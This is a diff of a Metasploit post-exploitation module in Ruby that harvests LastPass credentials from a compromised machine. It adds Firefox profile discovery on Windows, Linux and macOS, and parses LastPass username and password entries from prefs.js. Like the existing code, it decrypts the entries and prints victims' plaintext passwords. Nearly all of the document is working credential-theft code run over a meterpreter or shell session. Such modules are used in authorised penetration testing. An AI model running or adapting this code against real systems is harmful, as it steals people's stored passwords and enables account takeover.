@@ -36,28 +36,21 @@ class Metasploit3 < Msf::Post
 
     print_status "Looking for credentials in all databases found..."
 
-    credentials = []
+    credentials = [] # All credentials to be decrypted
     db_paths.each do |db_path|
-      if db_path =~ /Mozilla/ # Firefox
+      if db_path =~ /Mozilla/i # Firefox
         password_line = nil
         # Read and store the remote preferences file locally
         data = read_file(db_path)
         loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{db_path}")
 
-        # Parse preference file
-        user_line = password_line = nil
-        File.readlines(loot_path).each do |line|
-          user_line = line if (line['extensions.lastpass.loginusers'])
-          password_line = line if (line['extensions.lastpass.loginpws'])
+        # Extract usernames and passwords from preference file
+        firefox_encoded_creds = firefox_credentials(loot_path)
+        next unless firefox_encoded_creds
+        firefox_encoded_creds.each do |creds|
+          credentials.push([URI.unescape(creds[0]), URI.unescape(creds[1])]) unless creds[0].nil? || creds[1].nil?
         end
-        
-        # Extract usernames and passwords
-        user_line.match(/user_pref\("extensions.lastpass.loginusers", "(.*)"\);/) ? encoded_username = user_line.match(/user_pref\("extensions.lastpass.loginusers", "(.*)"\);/)[1] : encoded_username = nil
-        password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/) ? encoded_password = password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)[1] : encoded_password = nil
-        credentials.push([URI.unescape(encoded_username), Base64.decode64(encoded_password)]) unless encoded_username.nil? || encoded_password.nil?
 
-      elsif db_path =~ /Explorer/ # Internet Explorer
-        
       else # Chrome, Safari and Opera
         # Read and store the remote database locally
         data = read_file(db_path)
@@ -72,27 +65,36 @@ class Metasploit3 < Msf::Post
       credentials.each do |row| # Decrypt passwords
         print_status "Decrypting password for user #{row[0]}..."
         password = clear_text_password(row[0], row[1])
-        print_good("Username: '#{row[0]}' -> Password: '#{password}'") unless password.blank?
+        print_good("Username: '#{row[0]}' => Password: '#{password}' (Discard outer single quotes)") unless password.blank?
         print_line ""
       end
     end
   end
 
-
   # Finds the databases in the victim's machine
-  def database_paths # Based on https://lastpass.com/support.php?cmd=showfaq&id=425
+  def database_paths
     platform = session.platform
     found_dbs_paths = []
-    user_profiles = user_profiles
+    existing_profiles = user_profiles
 
     case platform
     when /win/
       os = session.sys.config.sysinfo['OS']
-      user_profiles = grab_user_profiles
 
       if os =~ /Vista|Windows 7|Windows 8/
-        user_profiles.each do |user_profile|
+        existing_profiles.each do |user_profile|
           print_status "Found user: #{user_profile['UserName']}"
+
+          # Check Firefox
+          print_status 'Checking in Firefox...'
+          profiles = profile_paths("#{user_profile['AppData']}\\Mozilla\Firefox\Profiles", "Firefox")
+          if profiles
+            print_good "Found #{profiles.size} profile files in Firefox"
+            profiles.each do |profile_path|
+              file_paths = ["#{profile_path}\\prefs.js"]
+              found_dbs_paths.push(file_paths) unless file_paths.nil?
+            end
+          end
 
           # Check Chrome
           path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
@@ -113,7 +115,7 @@ class Metasploit3 < Msf::Post
         end
 
       elsif os =~ /XP/
-        user_profiles.each do |user_profile|
+        existing_profiles.each do |user_profile|
           print_status "Found user: #{user_profile['UserName']}"
 
           # Check Firefox
@@ -154,8 +156,19 @@ class Metasploit3 < Msf::Post
       end
 
     when /unix|linux/
-      user_profiles.each do |user_profile|
+      existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
+
+        # Check Firefox
+        print_status 'Checking in Firefox...'
+        profiles = profile_paths("#{user_profile['LocalAppData']}/.mozilla/firefox", "Firefox")
+        if profiles
+          print_good "Found #{profiles.size} profile files in Firefox"
+          profiles.each do |profile_path|
+            file_paths = ["#{profile_path}/prefs.js"]
+            found_dbs_paths.push(file_paths) unless file_paths.nil?
+          end
+        end
 
         # Check Chrome
         path = "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
@@ -164,8 +177,19 @@ class Metasploit3 < Msf::Post
       end
 
     when /osx/
-      user_profiles.each do |user_profile|
+      existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
+
+        # Check Firefox
+        print_status 'Checking in Firefox...'
+        profiles = profile_paths("#{user_profile['LocalAppData']}\\Firefox\\Profiles", "Firefox")
+        if profiles
+          print_good "Found #{profiles.size} profile files in Firefox"
+          profiles.each do |profile_path|
+            file_paths = ["#{profile_path}\\prefs.js"]
+            found_dbs_paths.push(file_paths) unless file_paths.nil?
+          end
+        end
 
         # Check Chrome
         path = "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
@@ -191,15 +215,18 @@ class Metasploit3 < Msf::Post
     found_dbs_paths.flatten
   end
 
-
   # Returns the relevant information from user profiles
   def user_profiles
     case session.platform
     when /unix|linux/
       user_profiles = []
-      user_names = session.shell_command("ls /home").split
+      if session.type == "meterpreter"
+        user_names = client.fs.dir.entries("/home")
+      else
+        user_names = session.shell_command("ls /home").split
+      end
       user_names.each do |user_name|
-        user_profiles.push({ 'UserName' => user_name, "LocalAppData" => "/home/#{user_name} "})
+        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}") if user_name != '.' &&  user_name != '..'
       end
 
       return user_profiles
@@ -208,7 +235,7 @@ class Metasploit3 < Msf::Post
       user_profiles = []
       user_names = session.shell_command("ls /Users").split
       user_names.each do |user_name|
-        user_profiles.push({ 'UserName' => user_name, "AppData" => "/Users/#{user_name}/Library", "LocalAppData" => "/Users/#{user_name}/Library/Application Support" }) if user_name != 'Shared'
+        user_profiles.push('UserName' => user_name, "AppData" => "/Users/#{user_name}/Library", "LocalAppData" => "/Users/#{user_name}/Library/Application Support") if user_name != 'Shared'
       end
 
       return user_profiles
@@ -220,8 +247,6 @@ class Metasploit3 < Msf::Post
       return nil
     end
   end
-
-
 
   # Extracts the databases paths from the given folder ignoring . and ..
   def file_paths(path, browser)
@@ -255,8 +280,6 @@ class Metasploit3 < Msf::Post
     end
   end
 
-
-
   # Returns the profile path for Firefox
   def profile_paths(path, browser)
     found_dbs_paths = []
@@ -265,13 +288,13 @@ class Metasploit3 < Msf::Post
       if session.type == "meterpreter"
         files = client.fs.dir.entries(path)
         files.each do |file_path|
-          found_dbs_paths.push(File.join(path, file_path).gsub("/","\\")) if file_path != '.' &&  file_path != '..'
+          found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' &&  file_path != '..' && file_path.match(/.*\.default/)
         end
 
       elsif session.type == "shell"
         files = session.shell_command("ls \"#{path}\"").split
         files.each do |file_path|
-          found_dbs_paths.push(File.join(path, file_path).gsub("/","\\"))
+          found_dbs_paths.push(File.join(path, file_path)) if file_path.match(/.*\.default/)
         end
 
       else
@@ -288,8 +311,29 @@ class Metasploit3 < Msf::Post
     end
   end
 
+  # Parses the Firefox preferences file and returns encoded credentials
+  def firefox_credentials(loot_path)
+    credentials = []
+    password_line = nil
+    File.readlines(loot_path).each do |line|
+      password_line = line if line['extensions.lastpass.loginpws']
+    end
 
+    return nil unless password_line
 
+    if password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)
+      encoded_credentials = password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)[1]
+    else
+      return nil
+    end
+
+    creds_per_user = encoded_credentials.split("|")
+    creds_per_user.each do |user_creds|
+      credentials.push(user_creds.split("=")) if user_creds.split("=").size > 1 # Any valid credentials present?
+    end
+
+    credentials
+  end
 
   # Decrypts the password
   def clear_text_password(email, encrypted_data)
